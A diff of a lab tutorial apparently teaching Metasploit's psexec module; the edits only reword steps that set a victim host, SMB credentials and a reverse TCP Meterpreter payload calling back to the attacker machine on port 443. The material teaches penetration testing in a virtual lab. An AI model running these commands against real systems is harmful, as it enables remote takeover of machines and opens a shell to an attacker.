@@ -54,7 +54,7 @@ Within the Metasploit framework console, load the psexec exploit module by typin
 
 Type `show options` to view the exploit configuration parameters.
 
-Set `RHOST` (remote host) to be the IP address of the victim machine by typing `set RHOST 192.168.115.129`.
+Set the remote host to be the IP address of the victim machine by typing `set RHOST 192.168.115.129`.
 
 Set the username to authenticate as by typing `set SMBUser Victim`. Note that you may need to replace `Victim` with the Windows username you used to configure your virtual machine with during setup.
 
@@ -62,7 +62,7 @@ Set the password to authenticate with by typing `set SMBPass badpass`. Again you
 
 Finally let's configure a reverse TCP Meterpreter payload that will execute Meterpreter on the victim machine and connect back to our attacker machine with the active session. Configure the payload by typing `set PAYLOAD windows/meterpreter/reverse_tcp`.
 
-Set the outbound Meterpreter connection address to be the IP address of the attacker machine by typing `set LHOST 192.168.115.128`.
+Set the outbound Meterpreter connection address to be the local host (the IP address of the attacker machine) by typing `set LHOST 192.168.115.128`.
 
 Set the outbound Meterpreter connection port to be port 443 (https) by typing `set LPORT 443`.
 
